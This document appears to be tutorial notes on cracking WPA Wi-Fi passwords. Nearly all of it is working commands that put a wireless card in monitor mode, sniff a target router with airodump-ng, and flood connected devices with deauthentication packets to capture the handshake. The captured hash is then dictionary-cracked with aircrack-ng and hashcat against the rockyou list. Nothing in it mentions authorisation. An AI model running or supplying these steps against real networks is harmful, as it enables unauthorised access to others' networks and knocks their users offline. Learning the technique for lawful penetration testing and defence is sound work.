# Wireless Access Point Cracking

This attack needs a wireless card that can be run in monitor mode. When targeting a router, we need to be in range, know the channel it is running on, and its MAC address. We wait for someone to connect, thus initiating a 4-way handshake where we want to sniff the hashed password. To initiate all of this, we run a deauthentication attack to kick off connected devices. Once we have a hashed password, we run it through a tool like Aircrack or Hashcat which can run through 300-100,000 passwords/second.

## Putting Wireless Card in Monitor Mode

Mac - `ifconfig` - returns data on all interfaces including WLAN (en1)

Linux - `iwconfig`

```
ifconfig ROUTERNAME down
iwconfig ROUTERNAME mode monitor
ifconfig ROUTERNAME up
```

Double check because sometimes it will automatically switch back to managed mode.

## Deauthenticating Devices and Cracking Passwords

`airmon-ng check ROUTERNAME` - returns a list of running processes that could interfere with our modifaction of the 4-way handshake

`airmon-ng check kill` - kills the previously returned processes

Double check that your card is still in monitor mode

`airodump-ng ROUTERNAME` - begins sniffing for information. BSSID (MAC address), ESSID (name of wifi), CH (channel), ENC (encryption type), #Data and Beacons (is wifi currently in use), PWR (distance to wifi)

`airodump-ng -c CHANNEL# --bssid ROUTERMAC# -w FILE_NAME ROUTERNAME` - begins sniffing the target wifi and saves data to a file. We can see the devices currently connected to this access point.

While airodump is running - 

`aireplay-ng -0 0 -a ROUTERMAC# ROUTERNAME` - send deauthentication packets indefinitely until we kill the program with Ctrl+C.

Check the airodump console and look for a WPA-handshake text in the top right corner. This indicates that we successfully sniffed a hashed password. The .cap file produced has the info we need.

`locate rockyou.txt` - password list of 14,000,000 passwords.

`cd ROCKYOU DIRECTORY`

`cp rockyou.txt.gz /home/NAME/Desktop`

`cd Desktop`

`gzip -d rockyou.txt.gz`

`aircrack-ng -w rockyou.txt FILE_NAME.cap` - this will begin cracking our password (using only CPU) and give us an estimated time remaining. A good laptop will be about 4,000 passwords/second. Once it finds the password, it will stop running and print "Key found!"

## Hashcat Password Cracking

Hashcat uses CPU and GPU

`hashcat -help` - look through encryption types, under Network Protocols look for WPA hash (WPA-EAPOL-PBKDF2 [Code:2500])

Convert .cap file to .hccapx file online.

`hashcat -a 0 -m 2500 FILE_NAME.hccapx rockyou.txt` - runs an attack of lowest level, using WPA, our target wifi info, and rockyou password list. 's' shows current status and 'q' quits.